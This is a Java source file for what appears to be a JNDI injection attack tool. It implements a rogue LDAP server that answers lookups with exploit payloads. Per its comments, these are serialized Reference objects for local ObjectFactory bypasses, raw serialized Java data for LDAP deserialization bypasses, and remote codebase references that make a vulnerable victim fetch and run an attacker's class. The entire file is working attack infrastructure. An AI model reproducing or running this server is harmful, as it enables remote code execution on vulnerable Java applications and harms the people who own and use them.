package map.jndi.server;

import map.jndi.Config;
import map.jndi.Dispatcher;
import map.jndi.util.SerializeUtil;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.naming.Reference;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

public class LDAPServer implements Runnable {
    private String ip;
    private int port;

    public LDAPServer(String ip, int port) {
        this.ip = ip;
        this.port = port;
    }

    @Override
    public void run() {
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=example,dc=com");
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    this.port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor());
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("[LDAP] Listening on " + this.ip + ":" + this.port);
            ds.startListening();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult searchResult) {
            String base = searchResult.getRequest().getBaseDN();
            Entry e = new Entry(base);

            String path = "/" + base.split(",")[0]; // 获取路由

            System.out.println("[LDAP] Send result for " + path);

            // 路由分发, 为其匹配对应的 Controller 和方法
            Object result;

            if (Config.url != null) {
                System.out.println("[URL] " + Config.url);
                result = Dispatcher.getInstance().service(Config.url);
            } else {
                result = Dispatcher.getInstance().service(path);
            }

            e.addAttribute("javaClassName", "foo");

            if (result instanceof Reference) {
                // 返回序列化后的 Reference/ResourceRef 对象, 用于本地 ObjectFactory 绕过
                e.addAttribute("javaSerializedData", SerializeUtil.serialize(result));
            } else if(result instanceof byte[]) {
                // 返回 Java 序列化数据, 用于高版本 LDAP 反序列化绕过
                e.addAttribute("javaSerializedData", (byte[]) result);
            } else {
                // 返回 Reference 对象, 指定 codebase, 用于常规 JNDI 注入
                e.addAttribute("objectClass", "javaNamingReference");
                e.addAttribute("javaCodebase", Config.codebase);
                e.addAttribute("javaFactory", (String) result);
            }

            try {
                searchResult.sendSearchEntry(e);
                searchResult.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }
}
